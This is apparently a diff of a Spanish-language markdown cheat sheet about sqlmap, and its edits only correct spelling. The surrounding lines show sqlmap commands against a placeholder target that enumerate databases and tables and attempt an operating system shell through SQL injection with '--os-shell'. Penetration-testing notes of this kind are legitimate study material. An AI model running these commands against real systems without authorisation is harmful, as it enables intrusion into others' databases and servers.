@@ -3,7 +3,7 @@
 
 Esta herramienta sirve para automatizar ataques de sql y para enumerar estas bases de datos
 
-- uso basico y ruidosos
+- uso básico y ruidosos
 
 ```bash
 sqlmap -u <url-objetivo> --dbs --batch --forms
@@ -14,7 +14,7 @@ sqlmap -u <url-objetivo> --dbs --batch --forms
 sqlmap -u <url-objetivo> -D <base de datos> --tables --batch --forms
 ```
 
-- Si la base de datos es vulnerable a sql injection podremos porvar a ver si nos retorna una shell directamente con el comando 
+- Si la base de datos es vulnerable a sql injection podremos probar a ver si nos retorna una shell directamente con el comando 
 ```bash
 sqlmap -u <url-objetivo> --os-shell
 ```
